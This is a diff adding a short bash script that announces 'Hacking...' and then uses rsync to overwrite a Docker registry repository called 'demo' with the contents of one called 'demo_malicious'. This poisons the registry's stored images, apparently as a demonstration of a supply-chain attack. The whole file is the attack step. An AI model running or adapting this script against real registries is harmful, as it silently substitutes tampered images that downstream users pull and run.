@@ -1,0 +1,3 @@
+#! /bin/bash
+echo "# Hacking..."
+rsync -a  /var/lib/registry/docker/registry/v2/repositories/demo_malicious/  /var/lib/registry/docker/registry/v2/repositories/demo/
